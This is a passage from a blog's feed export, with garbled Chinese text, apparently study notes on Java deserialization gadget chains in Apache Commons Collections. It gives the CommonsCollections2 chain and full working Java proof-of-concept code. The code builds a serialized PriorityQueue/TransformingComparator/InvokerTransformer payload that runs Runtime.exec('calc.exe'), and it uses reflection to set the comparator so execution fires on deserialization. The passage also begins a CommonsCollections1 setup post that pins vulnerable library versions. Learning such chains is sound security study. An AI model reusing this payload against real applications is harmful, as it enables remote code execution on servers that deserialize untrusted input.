unserialize(<span class="hljs-string">&quot;xsw6_a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6_a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ccé“¾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections2</title>
    <link href="/2022/03/03/CommonsCollections2/"/>
    <url>/2022/03/03/CommonsCollections2/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><p>å¦‚æœCC1ç†è§£çš„å¾ˆå……åˆ†ï¼Œç†è§£CC2å°±è·Ÿç©ä¸€æ ·ã€‚</p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br> <br>      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235712.png" alt="QQæˆªå›¾20220303211048"></p><p><strong>PriorityQueue</strong>å°±ç›¸å½“äºä»£æ›¿äº†cc1ä¸­çš„<strong>AnnotationInvocationHandler</strong>ã€‚å…ˆç»§ç»­è·Ÿè¿›å…¥<strong>heapify()</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235455.png" alt="QQæˆªå›¾20220303211540"></p><p>ç„¶åç»§ç»­è·Ÿè¿›ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235683.png" alt="QQæˆªå›¾20220303211553"></p><p>ç„¶åçœ‹çœ‹è¿™ä¸¤ä¸ªåœ°æ–¹ã€‚å‘ç°è¿™é‡Œçš„<strong>siftDownUsingComparator()<strong>é‡Œé¢è°ƒç”¨äº†</strong>comparator.compare</strong>ã€‚è€Œè¿™é‡Œå‡‘å·§çš„å°±æ˜¯ <strong>TransformingComparator</strong><br>å®ç°äº† <strong>compare</strong>æ¥å£ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235792.png" alt="QQæˆªå›¾20220303211839"></p><p>å¹¶ä¸”è°ƒç”¨äº†<strong>transform</strong>ã€‚åç»­å°±è·Ÿcc1ï¼Œå·®ä¸å¤šã€‚<br>ä¸€ä¸ªä¸€ä¸ªåˆ†æã€‚</p><h2 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br></code></pre></td></tr></table></figure><p>ä¼ å…¥å°±å¯ï¼Œåç»­ç›´æ¥è°ƒç”¨<strong>transform</strong></p><h2 id="heapify"><a href="#heapify" class="headerlink" title="heapify()"></a>heapify()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>          siftDown(i, (E) queue[i]);<br>  &#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåˆ¤æ–­äº†size&gt;&gt;&gt;1ã€‚æ‰èƒ½è¿›å…¥  <strong>siftDown(i, (E) queue[i]);</strong></p><h2 id="siftDown"><a href="#siftDown" class="headerlink" title="siftDown()"></a>siftDown()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>      <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)<br>          siftDownUsingComparator(k, x);<br>      <span class="hljs-keyword">else</span><br>          siftDownComparable(k, x);<br>  &#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸ºäº†è¿›å…¥ <strong>siftDownUsingComparator(k, x)<strong>è¦ä¿è¯</strong>comparator</strong>ä¸å¯ä»¥ä¸ºç©ºã€‚<br>å¹¶ä¸”è¿™é‡Œä¼ å…¥çš„å€¼ä¸èƒ½å°äº1ã€‚ä¸ç„¶è¿™é‡Œä¼šæŠ¥é”™ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032236941.png" alt="QQæˆªå›¾20220303214616"></p><p>æ‰€ä»¥æ„é€ ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>, transformingComparator);<br></code></pre></td></tr></table></figure><h2 id="POCï¼ˆæ®‹ç¼ºï¼‰"><a href="#POCï¼ˆæ®‹ç¼ºï¼‰" class="headerlink" title="POCï¼ˆæ®‹ç¼ºï¼‰"></a>POCï¼ˆæ®‹ç¼ºï¼‰</h2><p>è¿™æ ·å°±æ˜¯æ˜¯æ²¡æœ‰ååºåˆ—åŒ–ä¹Ÿèƒ½è¿›è¡Œå¼¹è®¡ç®—å™¨ï¼Œè¿˜å¼¹äº†è¿ä¸ªã€‚emmmâ€¦</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc2Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>, transformingComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        serialize(priorityQueue);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>       <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>       <span class="hljs-keyword">return</span> o;<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="é—®é¢˜-æ²¡æœ‰ç»è¿‡ååºåˆ—åŒ–ä»èƒ½å¼¹å‡ºè®¡ç®—å™¨ã€‚"><a href="#é—®é¢˜-æ²¡æœ‰ç»è¿‡ååºåˆ—åŒ–ä»èƒ½å¼¹å‡ºè®¡ç®—å™¨ã€‚" class="headerlink" title="é—®é¢˜ æ²¡æœ‰ç»è¿‡ååºåˆ—åŒ–ä»èƒ½å¼¹å‡ºè®¡ç®—å™¨ã€‚"></a>é—®é¢˜ æ²¡æœ‰ç»è¿‡ååºåˆ—åŒ–ä»èƒ½å¼¹å‡ºè®¡ç®—å™¨ã€‚</h2><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥è¯¦ç»†è·Ÿä¸€ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235678.png" alt="QQæˆªå›¾20220303221145"></p><p>åœ¨è·Ÿå¦‚addä¹‹åï¼Œè¿™é‡Œçš„size&#x3D;2ï¼Œç„¶åç»§ç»­è·Ÿè¿›<strong>siftUpï¼ˆï¼‰</strong>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032214484.png" alt="QQæˆªå›¾20220303221246"></p><p>ç»§ç»­è·Ÿè¿›ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235283.png" alt="QQæˆªå›¾20220303221535"></p><p>ç»§ç»­ã€‚ç„¶åäº§ç”Ÿäº†ä¸¤æ¬¡<strong>transform</strong>ï¼Œæ‰§è¡Œäº†ä¸¤æ¬¡ä»£ç ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032215085.png"></p><p>å¯ä»¥è¯•è¯•<strong>siftUpComparable</strong></p><h2 id="siftUpComparable"><a href="#siftUpComparable" class="headerlink" title="siftUpComparable"></a>siftUpComparable</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032236883.png" alt="QQæˆªå›¾20220303222405"></p><p>å¯æƒœæœ€åè·Ÿäº†ä¸€éï¼Œç›´æ¥æ²¡æœ‰è°ƒç”¨**compare()**ã€‚</p><h2 id="ç ´å±€"><a href="#ç ´å±€" class="headerlink" title="ç ´å±€"></a>ç ´å±€</h2><p>åå°„ï¼<br>ç›´æ¥åé¢åœ¨ç»™ <strong>PriorityQueue</strong>æ·»åŠ <strong>comparator</strong>å‚æ•°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,transformingComparator);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªå°é—®é¢˜ã€‚æˆ‘ä¸€ç›´åœ¨fornameé‡Œé¢çº ç»“ã€‚ä¸€ç›´å¡«æˆè¿™ä¸ªï¼ˆjava.util.function.Consumer.PriorityQueueï¼‰ï¼Œåç»­åœ¨ï¼ˆå†™pocçš„é¡µé¢æ‰çœ‹åˆ°<code>import java.util.PriorityQueue;</code>ï¼Œemmmæ„Ÿè§‰è‡ªå·±æœ‰ç‚¹ç¬¨ã€‚ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc2Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span> );<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,transformingComparator);<br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>       <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>       <span class="hljs-keyword">return</span> o;<br>   &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ccé“¾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections1</title>
    <link href="/2022/03/03/CommonsCollections1/"/>
    <url>/2022/03/03/CommonsCollections1/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><strong>jdk8u71ä¹‹åä¿®å¤äº†æ¼æ´</strong></p><p>è¿™æ˜¯æˆ‘ç”¨çš„ç‰ˆæœ¬ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725224.png" alt="QQæˆªå›¾20220302152210"></p><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><p><strong>æ¼æ´ç‰ˆæœ¬ï¼šApache-Commons-Collections&lt;&#x3D;3.1</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Apache-Commons-Collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725366.png" alt="QQæˆªå›¾20220302151835"></p><h3 id="sun-reflect-annotation"><a href="#sun-reflect-annotation" class="headerlink" title="sun.reflect.annotation"></a>sun.reflect.annotation</h3><p>è¿™ä¸ªåŒ…æˆ‘ä»¬è¦è‡ªè¡Œå¯¼å…¥ã€‚ï¼ˆå¯¹åº”æ‰¾åˆ°ç‰ˆæœ¬ï¼‰<br><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip</a></p><p>æ‰¾åˆ°jdkç‰ˆæœ¬ï¼Œè§£å‹ç¼©src.zip<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021539384.png" 